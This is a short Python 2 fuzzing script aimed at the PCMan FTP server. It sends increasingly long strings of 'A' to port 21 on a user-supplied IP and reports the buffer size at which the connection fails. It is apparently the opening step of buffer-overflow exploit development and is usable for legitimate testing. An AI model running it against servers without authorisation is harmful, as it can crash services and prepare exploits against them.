#!/usr/bin/env python
import socket
import sys

if len(sys.argv) < 2:
  print "[*] PCMan FTP fuzzer"
  print "[*] Usage: "+sys.argv[0]+" <ip addr>"
  sys.exit()

buffer = ["\x41"]
counter = 100
while len(buffer) <= 30:
  buffer.append("\x41" * counter)
  counter = counter + 200

try:
  for string in buffer:
    print "[*] Fuzzing Login command %s bytes" % len(string)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((str(sys.argv[1]), 21))

    s.recv(1024)
    s.send('{}\r\n'.format(string))
    s.recv(1024)
    s.send('QUIT\r\n')
    s.close()
except socket.error:
  print "[-] Crash with {} bytes".format(len(string))
